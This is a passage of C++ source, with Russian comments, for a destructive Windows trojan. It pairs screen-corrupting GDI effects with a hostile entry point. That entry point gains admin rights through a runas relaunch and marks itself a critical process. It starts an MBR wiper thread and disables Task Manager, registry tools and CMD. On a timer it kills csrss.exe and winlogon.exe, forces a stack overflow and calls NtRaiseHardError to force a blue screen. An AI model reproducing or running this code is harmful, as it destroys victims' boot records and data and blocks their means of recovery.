            BitBlt(hdc, x, vshift, 3, sh, mdc, x, 0, SRCINVERT);
        }
        for (int i = 0; i < 15; i++) {
            int bx = rand() % sw, by = rand() % sh;
            BitBlt(hdc, bx, by, 20 + rand() % 40, 20 + rand() % 40, mdc, bx, by, NOTSRCCOPY);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(15);
    }
}

// 5. TEXT_MAELSTROM
DWORD WINAPI text_maelstrom(LPVOID lpvd) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        SetBkColor(hdc, Hue(4));
        HFONT font = CreateFontA(50 + rand() % 30, 20 + rand() % 30, rand() % 720 - 360, rand() % 720 - 360,
                                  FW_BOLD, rand() % 2, rand() % 2, rand() % 2, ANSI_CHARSET, 0, 0, 0, 0, "Lucida Console");
        SelectObject(hdc, font);
        SetTextColor(hdc, Hue(5));
        for (int i = 0; i < 20; i++) {
            char buf[64];
            sprintf(buf, "0x%X", rand() % 0xFFFFFFFF);
            TextOutA(hdc, rand() % sw, rand() % sh, buf, strlen(buf));
        }
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(30);
    }
}

// 6. BLUR_CASCADE
DWORD WINAPI blur_cascade(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmpi = {0};
    BLENDFUNCTION blur;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 8;
    while (1) {
        hdc = GetDC(0);
        BitBlt(dcCopy, 0, 0, sw, sh, hdc, -40 - rand() % 20, 0, SRCCOPY);
        BitBlt(dcCopy, 0, 0, sw, sh, hdc, sw - 40 - rand() % 20, 0, SRCCOPY);
        BitBlt(dcCopy, 0, 0, sw, sh, hdc, 0, -20 - rand() % 10, SRCPAINT);
        AlphaBlend(hdc, 0, 0, sw, sh, dcCopy, 0, 0, sw, sh, blur);
        ReleaseDC(0, hdc);
        Sleep(20);
    }
}

// 7. DOUBLE_BLUR
DWORD WINAPI double_blur(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmpi = {0};
    BLENDFUNCTION blur;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 6;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(dcCopy, rand() % 15, rand() % 15, sw, sh, hdc, rand() % -15, rand() % -15, SRCPAINT);
        BitBlt(dcCopy, rand() % 15, rand() % 15, sw, sh, hdc, rand() % -15, rand() % -15, SRCINVERT);
        AlphaBlend(hdc, 0, 0, sw, sh, dcCopy, 0, 0, sw, sh, blur);
        ReleaseDC(0, hdc);
        Sleep(15);
    }
    return 0;
}

// 8. EXEC_BLITZ
DWORD WINAPI exec_blitz(LPVOID lpvd) {
    WIN32_FIND_DATAA data;
    while (1) {
        HANDLE find = FindFirstFileA("C:\\WINDOWS\\*.exe", &data);
        if (find != INVALID_HANDLE_VALUE) {
            ShellExecuteA(0, "open", data.cFileName, 0, 0, SW_SHOW);
            while (FindNextFileA(find, &data)) {
                ShellExecuteA(0, "open", data.cFileName, 0, 0, SW_SHOW);
                Sleep(rand() % 5000);
            }
            FindClose(find);
        }
        ShellExecuteA(0, "open", "cmd.exe", "/c start /b calc.exe", 0, SW_HIDE);
        ShellExecuteA(0, "open", "cmd.exe", "/c start /b notepad.exe", 0, SW_HIDE);
        Sleep(rand() % 3000);
    }
}

// 9. XOR_SHRED
DWORD WINAPI xor_shred(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = {0};
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
        for (int x = 0; x < sw; x++) {
            for (int y = 0; y < sh; y++) {
                int idx = y * sw + x;
                HSL hsl = Colors::rgb2hsl(rgbquad[idx]);
                int fx = (int)(x ^ (y + (i * 3) * (x & y)));
                hsl.h = fmod(hsl.h + fx / 350.f + x * 0.003f, 1.f);
                hsl.s = fmax(0.f, fmin(1.f, hsl.s + 0.06f * sin((x ^ y) * 0.005f + i * 0.02f)));
                hsl.l = fmax(0.f, fmin(1.f, hsl.l + 0.04f * cos((x + y) * 0.005f + i * 0.025f)));
                rgbquad[idx] = Colors::hsl2rgb(hsl);
                if ((x ^ y ^ i) % 4 == 0) {
                    rgbquad[idx].rgbBlue = 255 - rgbquad[idx].rgbBlue;
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(16);
    }
    return 0;
}

// 10. BITWISE_CHAOS
DWORD WINAPI bitwise_chaos(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = {0};
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
        for (int x = 0; x < sw; x++) {
            for (int y = 0; y < sh; y++) {
                int idx = y * sw + x;
                HSL hsl = Colors::rgb2hsl(rgbquad[idx]);
                int fx = (int)(x & (x * ((i * 3) ^ 0xFF)));
                hsl.h = fmod(hsl.h + fx / 400.f + y * 0.002f, 1.f);
                hsl.s = fmax(0.f, fmin(1.f, hsl.s + 0.07f * cos((x * y) * 0.003f + i * 0.018f)));
                hsl.l = fmax(0.f, fmin(1.f, hsl.l + 0.05f * sin((x + y + i) * 0.004f)));
                rgbquad[idx] = Colors::hsl2rgb(hsl);
                if ((x + i) % 3 == 0 && (y + i) % 3 == 0) {
                    rgbquad[idx].rgbRed = 255 - rgbquad[idx].rgbRed;
                    rgbquad[idx].rgbGreen = 255 - rgbquad[idx].rgbGreen;
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(17);
    }
    return 0;
}

// 11. SINE_RIP
DWORD WINAPI sine_rip(LPVOID lpvd) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.7f) {
            int a = (int)(sin(angle) * 400 + 200);
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, NOTSRCCOPY);
            BitBlt(hdc, 0, i + 1, sw, 1, hdc, -a/2, i + 1, SRCINVERT);
            angle += M_PI / 2.5;
        }
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

// 12. CORRUPT_PAYLOAD
DWORD WINAPI corrupt_payload(LPVOID lpvd) {
    while (1) {
        EnumChildWindows(NULL, [](HWND hwnd, LPARAM lParam) -> BOOL {
            SendMessageTimeoutA(hwnd, WM_SETTEXT, NULL, (LPARAM)"[CRITICAL FAILURE]", SMTO_ABORTIFHUNG, 100, NULL);
            SendMessageTimeoutA(hwnd, WM_SETTEXT, NULL, (LPARAM)"[SYSTEM COMPROMISED]", SMTO_ABORTIFHUNG, 100, NULL);
            return TRUE;
        }, NULL);
        Sleep(50);
    }
}

// 13. RANDOM_BLITZ
DWORD WINAPI random_blitz(LPVOID lpvd) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = sw;
    bmi.bmiHeader.biHeight = sh;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* pixels = NULL;
    while (1) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&pixels, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            if (rand() % 3 == 0) {
                pixels[i].rgbRed = rand() % 256;
                pixels[i].rgbGreen = rand() % 256;
                pixels[i].rgbBlue = rand() % 256;
            }
            if (rand() % 5 == 0) {
                pixels[i].rgbRed = 255 - pixels[i].rgbRed;
                pixels[i].rgbGreen = 255 - pixels[i].rgbGreen;
                pixels[i].rgbBlue = 255 - pixels[i].rgbBlue;
            }
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(0, desk);
        DeleteDC(desk);
        DeleteDC(deskMem);
        DeleteObject(scr);
        Sleep(5);
    }
}

// ==================== НОВЫЕ ЭФФЕКТЫ ====================

// 14. SPIN_BLUR — экран крутится по оси со смещением и размытием
DWORD WINAPI spin_blur(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    float angle = 0;
    BLENDFUNCTION blur;
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 50;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        // Создаём размытый слой
        HDC blurDC = CreateCompatibleDC(hdc);
        HBITMAP blurBmp = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(blurDC, blurBmp);
        BitBlt(blurDC, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        AlphaBlend(blurDC, 0, 0, w, h, mdc, 0, 0, w, h, blur);
        // Поворот с размытием
        int cx = w/2, cy = h/2;
        float rad = angle * 0.02f;
        float cosA = cos(rad);
        float sinA = sin(rad);
        float shiftX = sin(angle * 0.01f) * 80;
        float shiftY = cos(angle * 0.015f) * 60;
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int dx = x - cx;
                int dy = y - cy;
                int nx = cx + (int)(dx * cosA - dy * sinA + shiftX);
                int ny = cy + (int)(dx * sinA + dy * cosA + shiftY);
                if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                    BitBlt(hdc, x, y, 3, 3, blurDC, nx, ny, SRCCOPY);
                    // Добавляем инверсию на краях
                    if ((x + y + (int)angle) % 7 == 0) {
                        BitBlt(hdc, x, y, 2, 2, blurDC, nx, ny, NOTSRCCOPY);
                    }
                }
            }
        }
        angle += 0.5f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        DeleteDC(blurDC);
        DeleteObject(blurBmp);
        Sleep(10);
    }
}

// 15. SQUEEZE_STRETCH — сжатие/растяжение
DWORD WINAPI squeeze_stretch(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    float phase = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        float scaleX = 0.3f + 0.7f * fabs(sin(phase));
        float scaleY = 0.3f + 0.7f * fabs(cos(phase + 0.7f));
        int nw = (int)(w * scaleX);
        int nh = (int)(h * scaleY);
        if (nw < 1) nw = 1;
        if (nh < 1) nh = 1;
        StretchBlt(hdc, (w - nw)/2, (h - nh)/2, nw, nh, mdc, 0, 0, w, h, SRCCOPY);
        // Инвертированные полосы на границах
        for (int y = 0; y < h; y += 8) {
            BitBlt(hdc, 0, y, w, 1, mdc, 0, y, SRCINVERT);
        }
        phase += 0.04f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

// 16. WATERFALL_SHATTER — куски падают вниз
DWORD WINAPI waterfall_shatter(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int blocks[80][4];
    for (int i = 0; i < 80; i++) {
        blocks[i][0] = rand() % w;
        blocks[i][1] = rand() % h;
        blocks[i][2] = 15 + rand() % 40;
        blocks[i][3] = 15 + rand() % 40;
    }
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 80; i++) {
            blocks[i][1] += 2 + rand() % 4;
            if (blocks[i][1] > h) blocks[i][1] = -blocks[i][3];
            // Падение с искажением
            BitBlt(hdc, blocks[i][0], blocks[i][1], blocks[i][2], blocks[i][3],
                   mdc, blocks[i][0], blocks[i][1] - (rand() % 80), NOTSRCCOPY);
            BitBlt(hdc, blocks[i][0] + rand() % 30 - 15, blocks[i][1] + blocks[i][3]/2,
                   blocks[i][2]/2, blocks[i][3]/2, mdc, blocks[i][0], blocks[i][1], SRCINVERT);
            // Следы
            BitBlt(hdc, blocks[i][0] - 5, blocks[i][1] - 10, blocks[i][2], 5,
                   mdc, blocks[i][0], blocks[i][1], SRCAND);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(15);
    }
}

// 17. SIDEWAYS_SLIDE — уход в сторону
DWORD WINAPI sideways_slide(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    float offset = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int shift = (int)(w * 0.4f * sin(offset));
        BitBlt(hdc, shift, 0, w - abs(shift), h, mdc, 0, 0, SRCCOPY);
        BitBlt(hdc, -w + shift, 0, abs(shift), h, mdc, w - abs(shift), 0, SRCCOPY);
        // Инвертированные полосы
        for (int y = 0; y < h; y += 6) {
            BitBlt(hdc, shift/2, y, 40, 3, mdc, 0, y, SRCINVERT);
            BitBlt(hdc, -shift/3, y + 3, 40, 3, mdc, 0, y, NOTSRCCOPY);
        }
        offset += 0.025f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
}

// 18. SCREEN_EXPLODE — взрыв экрана
DWORD WINAPI screen_explode(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    int parts[200][5];
    for (int i = 0; i < 200; i++) {
        parts[i][0] = rand() % w;
        parts[i][1] = rand() % h;
        parts[i][2] = 8 + rand() % 20;
        parts[i][3] = 8 + rand() % 20;
        parts[i][4] = 1 + rand() % 6;
    }
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 200; i++) {
            parts[i][0] += (rand() % 9 - 4) * parts[i][4];
            parts[i][1] += (rand() % 9 - 4) * parts[i][4];
            if (parts[i][0] < 0) parts[i][0] = w;
            if (parts[i][0] > w) parts[i][0] = 0;
            if (parts[i][1] < 0) parts[i][1] = h;
            if (parts[i][1] > h) parts[i][1] = 0;
            BitBlt(hdc, parts[i][0], parts[i][1], parts[i][2], parts[i][3],
                   mdc, parts[i][0], parts[i][1], SRCCOPY);
            // Взрывные следы
            BitBlt(hdc, parts[i][0] + rand() % 15 - 7, parts[i][1] + rand() % 15 - 7,
                   parts[i][2]/2, parts[i][3]/2, mdc, parts[i][0], parts[i][1], NOTSRCCOPY);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

// 19. EARTHQUAKE_SHAKE — колбасит
DWORD WINAPI earthquake_shake(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int shakeX = rand() % 80 - 40;
        int shakeY = rand() % 80 - 40;
        BitBlt(hdc, shakeX, shakeY, w, h, mdc, 0, 0, SRCCOPY);
        // Разрывы
        for (int y = 0; y < h; y += 2) {
            if (rand() % 3 == 0) {
                int offset = rand() % 60 - 30;
                BitBlt(hdc, offset, y, w, 2, mdc, 0, y, SRCCOPY);
                BitBlt(hdc, -offset/2, y + 2, w, 2, mdc, 0, y, SRCINVERT);
            }
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(3);
    }
}

// ==================== STACK OVERFLOW ДЛЯ BSOD ====================

__declspec(noinline) VOID StackOverflowCrash() {
    volatile int buffer[8192] = {0};
    StackOverflowCrash();
}

// ==================== ПОТОК ДЛЯ BSOD ПО ТАЙМЕРУ ====================

// ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ: получаем PID процесса по имени
DWORD GetProcessIdByName(const char* name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, name) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

DWORD WINAPI TimerThread(LPVOID lpParam) {
    Sleep(TOTAL_EFFECTS_TIME);
    
    // ====== СПОСОБ 1: УБИВАЕМ CSRSS.EXE ======
    DWORD pid = GetProcessIdByName("csrss.exe");
    if (pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
    
    // ====== СПОСОБ 2: УБИВАЕМ WINLOGON.EXE ======
    pid = GetProcessIdByName("winlogon.exe");
    if (pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
    
    // ====== СПОСОБ 3: STACK OVERFLOW (ДОБИВАЕТ ВСЕГДА) ======
    StackOverflowCrash();
    
    return 0;
}

// ==================== ТОЧКА ВХОДА ====================

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    BOOL bIsAdmin = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &bIsAdmin);
        FreeSid(pAdmin);
    }
    if (!bIsAdmin) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = {sizeof(sei)};
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        ExitProcess(0);
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    ProcessIsCritical();
    CreateThread(0, 0, MBRWiper, 0, 0, 0);

    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", REG_DWORD, 2);

    CreateThread(0, 0, corrupt_payload, 0, 0, 0);
    Sleep(1000);
    CreateThread(0, 0, TimerThread, 0, 0, 0);

    // ====== ВСЕ ЭФФЕКТЫ ПО 20 СЕКУНД ======
    // Всего 19 эффектов × 20 сек = 380 сек = ~6 минут 20 секунд

    HANDLE t0 = CreateThread(0, 0, rgb_hell_drip, 0, 0, 0); sound_crush(); Sleep(20000); TerminateThread(t0, 0); CloseHandle(t0);
    HANDLE t1 = CreateThread(0, 0, chromatic_abyss, 0, 0, 0); sound_glitch(); Sleep(20000); TerminateThread(t1, 0); CloseHandle(t1);
    HANDLE t2 = CreateThread(0, 0, scanline_corrupt, 0, 0, 0); sound_scan(); Sleep(20000); TerminateThread(t2, 0); CloseHandle(t2);
    HANDLE t3 = CreateThread(0, 0, blur_cascade, 0, 0, 0); sound_shatter(); Sleep(20000); TerminateThread(t3, 0); CloseHandle(t3);

    HANDLE t4 = CreateThread(0, 0, text_maelstrom, 0, 0, 0);
    HANDLE t5 = CreateThread(0, 0, vertex_shred, 0, 0, 0); sound_pulse(); Sleep(20000); TerminateThread(t5, 0); CloseHandle(t5);

    HANDLE t6 = CreateThread(0, 0, double_blur, 0, 0, 0);
    HANDLE t7 = CreateThread(0, 0, exec_blitz, 0, 0, 0); sound_blast(); Sleep(20000); TerminateThread(t6, 0); CloseHandle(t6); TerminateThread(t4, 0); CloseHandle(t4); TerminateThread(t7, 0); CloseHandle(t7);

    HANDLE t8 = CreateThread(0, 0, xor_shred, 0, 0, 0); sound_demolish(); Sleep(20000); TerminateThread(t8, 0); CloseHandle(t8);
    HANDLE t9 = CreateThread(0, 0, bitwise_chaos, 0, 0, 0); sound_annihilate(); Sleep(20000); TerminateThread(t9, 0); CloseHandle(t9);
    HANDLE t10 = CreateThread(0, 0, sine_rip, 0, 0, 0); Sleep(20000); TerminateThread(t10, 0); CloseHandle(t10);
    HANDLE t11 = CreateThread(0, 0, random_blitz, 0, 0, 0); Sleep(20000); TerminateThread(t11, 0); CloseHandle(t11);

    // НОВЫЕ ЭФФЕКТЫ
    HANDLE t12 = CreateThread(0, 0, spin_blur, 0, 0, 0); sound_spin(); Sleep(20000); TerminateThread(t12, 0); CloseHandle(t12);
    HANDLE t13 = CreateThread(0, 0, squeeze_stretch, 0, 0, 0); sound_squeeze(); Sleep(20000); TerminateThread(t13, 0); CloseHandle(t13);
    HANDLE t14 = CreateThread(0, 0, waterfall_shatter, 0, 0, 0); sound_waterfall(); Sleep(20000); TerminateThread(t14, 0); CloseHandle(t14);
    HANDLE t15 = CreateThread(0, 0, sideways_slide, 0, 0, 0); sound_sideways(); Sleep(20000); TerminateThread(t15, 0); CloseHandle(t15);
    HANDLE t16 = CreateThread(0, 0, screen_explode, 0, 0, 0); sound_explode(); Sleep(20000); TerminateThread(t16, 0); CloseHandle(t16);
    HANDLE t17 = CreateThread(0, 0, earthquake_shake, 0, 0, 0); sound_quake(); Sleep(20000); TerminateThread(t17, 0); CloseHandle(t17);

    // ====== 100% BSOD НА ВСЕХ WINDOWS ======
BOOLEAN bl;
NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");

if (RtlAdjustPrivilege && NtRaiseHardError) {
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
}

Sleep(-1);
return 0;
}
